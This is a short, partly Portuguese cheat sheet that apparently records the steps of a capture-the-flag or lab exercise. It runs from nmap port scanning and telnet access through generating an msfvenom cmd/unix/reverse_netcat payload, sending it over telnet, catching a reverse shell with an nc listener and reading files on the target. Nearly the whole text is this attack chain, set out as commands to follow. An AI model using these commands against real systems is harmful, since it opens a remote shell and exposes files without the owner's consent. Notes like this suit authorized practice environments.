1) sudo nmap -sS -Pn -v  -p- "ip.address" -oN nmap.txt
2) ifconfig -> Procurar o meu IP
3) telnet ip/port -> Conectar a maquina
4) sudo tcpdump ip proto \icmp -i tun0 -> Ligar tcpdump
5) ping "ip.address" -c 1
        .RUN
6) msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=[listening port]
    ----- pick code from payload and run in telnet with nc-lvp on->
7) nc -lvp [listening port]
8) nc -lvp after msfvenom run code from telnet, check nc for connection from "IP":
9) if so, follow :
                            ls -> ver ficheiros
                            cat "nome do ficheiro"